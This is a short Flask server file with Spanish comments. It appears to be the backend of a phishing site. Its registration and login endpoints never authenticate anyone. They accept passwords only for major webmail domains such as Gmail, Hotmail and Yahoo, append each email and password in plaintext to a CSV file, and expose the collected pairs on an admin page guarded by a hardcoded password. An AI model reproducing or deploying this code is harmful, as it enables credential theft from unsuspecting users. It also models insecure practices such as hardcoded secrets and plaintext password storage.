from flask import Flask, render_template, request, redirect, url_for, session
import csv
import os

app = Flask(__name__)
app.secret_key = "una_clave_secreta_x_seguridad"  # puedes cambiarla

# Ruta principal: Tu página hecha
@app.route("/")
def index():
    return render_template("index.html")  # Tu index.html (copiado a /templates)

# Endpoint donde se reciben los datos del registro (correspondiente al fetch JS!)
@app.route("/registro", methods=["POST"])
def registro():
    correo = request.form.get("correo")
    contrasena = request.form.get("contrasena")

    if not correo or not contrasena:
        return "Faltan datos", 400

    # 🔒 Validación de dominio permitido
    dominios_validos = [
        'gmail.com', 'hotmail.com', 'hotmail.es', 'hotmail.fr',
        'outlook.com', 'outlook.es', 'outlook.fr',
        'yahoo.com', 'icloud.com', 'protonmail.com',
        'aol.com', 'gmx.com', 'msn.com'
    ]
    if '@' in correo:
        dominio = correo.split('@')[-1].lower()
        if dominio not in dominios_validos:
            return "Dominio de email no permitido", 400
    else:
        return "Email inválido", 400
    # 🔒 Fin de la validación

    # Guarda en archivo CSV los datos del usuario (IMPORTANTE: SOLO ADMIN ACCEDE)
    with open("user_data.csv", "a", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow([correo, contrasena])

    return "ok", 200

# Para el inicio de sesión (lo mismo, solo almacena los datos)
@app.route("/login", methods=["POST"])
def login():
    correo = request.form.get("correo")
    contrasena = request.form.get("contrasena")
    if not correo or not contrasena:
        return "Faltan datos", 400

    # 🔒 Validación de dominio permitido
    dominios_validos = [
        'gmail.com', 'hotmail.com', 'hotmail.es', 'hotmail.fr',
        'outlook.com', 'outlook.es', 'outlook.fr',
        'yahoo.com', 'icloud.com', 'protonmail.com',
        'aol.com', 'gmx.com', 'msn.com'
    ]
    if '@' in correo:
        dominio = correo.split('@')[-1].lower()
        if dominio not in dominios_validos:
            return "Dominio de email no permitido", 400
    else:
        return "Email inválido", 400
    # 🔒 Fin de validación

    with open("user_data.csv", "a", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow([correo, contrasena])
    return "ok", 200

# ADMIN: lista los registros solo si pones la contraseña correcta
@app.route("/admin", methods=["GET", "POST"])
def admin():
    if request.method == "POST":
        clave = request.form.get("clave")
        if clave != "192021":
            return render_template("admin_login.html", error="Contraseña incorrecta")

        # Si es correcto, muestra los datos guardados
        users = []
        if os.path.isfile("user_data.csv"):
            with open("user_data.csv", newline='', encoding="utf-8") as f:
                users = list(csv.reader(f))
        return render_template("admin_panel.html", users=users)
    else:
        return render_template("admin_login.html", error=None)

import os

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
